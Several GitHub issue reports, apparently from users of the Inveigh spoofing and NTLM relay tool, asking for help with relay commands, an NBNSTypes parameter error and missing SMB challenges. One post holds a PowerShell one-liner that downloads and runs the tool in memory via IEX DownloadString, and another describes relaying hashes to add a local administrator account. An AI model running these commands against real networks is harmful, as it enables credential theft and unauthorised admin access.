Hi,

I've pretty much mimicked the setup in the Wiki and ran the commands from the example section from Invoke-InveighRelay.
Both commands execute fine, and when I try to authenticate to the attacking host where Inveigh runs I do see the authentication and the NTLM hash. However, the command's set (Net user add && net localgroup administrators /add) are never run.

Any idea as to what I am missing? Both the machine running Invoke_InveighRelay and the machine I am targetting are Windows 10 1709.

Best,
Kim

With build 1459e04  running on Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 with powershell version:

```
PS C:\Windows\system32> $PSVersionTable.PSVersion

Major  Minor  Build  Revision
-----  -----  -----  --------
3      0      -1     -1
```

When specifying more than one NBNSType, as with the following oneliner:

`powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1'); Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -LLMNR Y -mDNS Y -NBNS Y -NBNSTypes 00,03,20""`

I consistently receive an error:

```
Invoke-Inveigh : Cannot validate argument on parameter 'NBNSTypes'. The argument "0" does not belong to the set "00,03,20,1B,1C,1D,1E" specified by the ValidateSet attribute. Supply an argument that
is in the set and then try the command again.

It will always work with a single specified nbnstype.  I'vet tried wrapping the nbnstype list in quotes but it does not seem to make a difference.

Invoke-InveighRelay was working perfectly but now gets stuck on 'Performing DNS lookups on any hostname targets.'. There are no hostname targets
Hello, and thank you for this great tool.

I'm facing a problem when trying to MITM the LLMNR requests through Inveigh. I use it with default settings, but what it happens at testing:

[+] [2018-10-29T22:21:53] LLMNR request for ppppppp received from 192.168.0.10 [Response Sent]
[+] [2018-10-29T22:21:53] LLMNR request for ppppppp received from 192.168.0.10 [Response Sent]
............

And I never receive the SMB challenge. Is that problem has something to do with firewall? I use Inveigh in elevated privileges.
Hi, 

Thank you for creating such a tool! 

While using InveighRelay, I noticed that it doesn't accept SMB1/2 to SMB1/2 Relay. From the description, InveighRelay does "NTLMv1/NTLMv2 HTTP/HTTPS/Proxy to SMB1/SMB2".

The idea is similar this article using Metasploit module (SMB_Relay).
